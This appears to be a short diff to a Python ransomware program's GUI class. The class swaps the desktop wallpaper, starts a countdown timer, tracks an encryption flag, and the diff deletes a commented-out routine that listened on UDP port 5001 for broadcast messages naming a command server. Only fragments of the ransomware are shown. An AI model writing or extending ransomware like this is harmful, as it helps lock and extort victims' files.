@@ -41,7 +41,6 @@ class RansomwareGUI:
         self.set_wallpaper(self.NEW_WALLPAPER)
 
         self.setup_ui()
-        #self.discover_server()
         self.start_timer()
 
     def load_config(self, config_file='server/config.ini'):
@@ -158,19 +157,6 @@ class RansomwareGUI:
             os.remove(self.OLD_WALLPAPER)
         if os.path.exists(self.ENCRYPTION_FLAG):
             os.remove(self.ENCRYPTION_FLAG)
-
-    """ def discover_server(self):
-        def broadcast_listener():
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.bind(('', 5001))
-            while not self.server_ip:
-                data, addr = sock.recvfrom(1024)
-                if data.startswith(b'SERVER_IP:'):
-                    self.server_ip = data[len(b'SERVER_IP:'):].decode()
-                    print(f"Serveur trouvé à l'adresse {self.server_ip}")
-
-        threading.Thread(target=broadcast_listener).start() """
 
     def setup_ui(self):
         message = (
